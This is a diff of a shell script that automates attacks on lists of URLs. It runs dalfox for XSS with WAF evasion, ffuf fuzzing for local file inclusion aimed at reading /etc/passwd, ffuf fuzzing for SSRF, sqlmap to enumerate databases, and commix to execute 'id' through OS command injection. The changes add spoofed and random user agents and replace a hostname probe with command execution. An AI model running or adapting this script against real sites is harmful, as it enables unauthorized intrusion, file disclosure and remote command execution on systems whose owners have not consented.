@@ -17,7 +17,7 @@ fi
 # Check XSS.txt file
 if [ -f "XSS.txt" ]; then
     # XSS injection
-    dalfox file XSS.txt --waf-evasion --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/115.0' -o output/XSS_Inject_Response.txt;
+    dalfox file XSS.txt --waf-evasion --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0' -o output/XSS_Inject_Response.txt;
     sleep 5
 fi
 
@@ -25,17 +25,17 @@ fi
 if [ -f "LFI.txt" ]; then
     # LFI injection
     cat LFI.txt | qsreplace FUZZ | while read url; do
-        ffuf -u $url -t 25 -mr "root:x" -w LFI_fuzz.txt -o output/LFI_Inject_Response.txt;
+        ffuf -u $url -c -v -t 25 -p 0.3 -mr "root:x" -w LFI_fuzz.txt >> output/LFI_Inject_Response.txt;
     done
     sleep 5
 fi
 
 # Check SSRF.txt file
 if [ -f "SSRF.txt" ]; then
-    # Open Redirect
-    cd Oralyzer
-    python3 oralyzer.py -l ../SSRF.txt | anew ../output/Open_Redirect_Response.txt
-    cd ../
+    # SSRF
+    cat SSRF.txt | qsreplace FUZZ | while read url; do
+        ffuf -u $url -c -v -t 25 -p 0.3 -w SSRF_Fuzz.txt -mc all -fs 0 >> output/Open_Redirect_Response.txt;
+        done
     sleep 5
 fi
 
@@ -60,7 +60,7 @@ fi
 # Check SQL.txt file
 if [ -f "SQL.txt" ]; then
     # SQL injection
-    sqlmap -m SQL.txt --level 3 --risk 1 --batch --dbs --random-agent --tamper=between | anew output/SQL_Inject_Response.txt;
+    sqlmap -m SQL.txt --level 3 --batch --dbs --random-agent | anew output/SQL_Inject_Response.txt;
     sleep 5
 fi
 
@@ -68,7 +68,7 @@ fi
 if [ -f "OS_Commands.txt" ]; then
     # OS command injection
     cd commix
-    cat ../OS_Commands.txt | while read url; do python3 commix.py -u $url --hostname | anew ../output/Command_Inject_Response.txt; done
+    cat ../OS_Commands.txt | while read url; do python3 commix.py -u $url --os-cmd "id" --batch --random-agent | anew ../output/Command_Inject_Response.txt; done
     cd ../
 fi
 
